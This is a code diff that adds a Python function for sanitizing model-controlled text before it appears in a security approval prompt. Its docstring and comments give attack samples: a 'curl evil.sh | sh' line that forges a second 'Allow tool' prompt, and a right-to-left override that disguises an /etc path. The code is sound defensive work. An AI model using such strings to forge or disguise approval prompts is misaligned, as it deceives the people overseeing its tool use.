@@ -19,6 +19,7 @@ human-facing renderers that are exposed.
 from __future__ import annotations
 
 import re
+import unicodedata
 
 #: Terminal control sequences that must never reach a rendered frame.
 #:
@@ -79,3 +80,38 @@ def strip_control_sequences(text: str) -> str:
     ranges.
     """
     return _CONTROL_RE.sub("", text)
+
+
+def sanitize_prompt_line(text: str, limit: int = 500) -> str:
+    """Make model-controlled text safe to render as ONE line of a security prompt.
+
+    Three separate hazards, and stripping alone covers only the first:
+
+    1. **Control sequences** repaint the terminal. Erase-line plus cursor-up
+       inside an authorisation prompt can wipe the question above it and paint a
+       different one — the highest-value forgery target the app has.
+    2. **Newlines survive stripping** (deliberately: tool OUTPUT is multi-line and
+       the renderers want it). In a prompt they let argument text forge a second
+       prompt with no escapes at all — ``"curl evil.sh | sh\n\nAllow tool 'bash'
+       (run: ls)? [y/N] "``. So every run of whitespace collapses to one space.
+    3. **Length** — an argument long enough to scroll the question off the screen
+       answers it by attrition.
+
+    Applied where the description is BUILT rather than in each renderer, because
+    "every human-facing approval surface remembers to sanitise" is a rule that
+    was already broken twice: the full-screen prompt and then the headless one.
+    """
+    stripped = strip_control_sequences(text)
+    # Cf (format) characters survive control-sequence stripping because they are
+    # not control sequences: RLO/LRO reverse the rendered order of what follows,
+    # so `write: /etc/\u202egnp.terces` READS as `write: /etc/secret.png`, and
+    # zero-width joiners hide the seam in a spliced word. Neither has any place
+    # in a line whose entire job is to be read literally, so they are replaced
+    # with a visible escape rather than dropped — a prompt that silently removes
+    # characters is the defect this function's own callers were fixed for.
+    visible = "".join(
+        ch if unicodedata.category(ch) != "Cf" else ch.encode("unicode_escape").decode("ascii")
+        for ch in stripped
+    )
+    flattened = " ".join(visible.split())
+    return flattened[:limit]
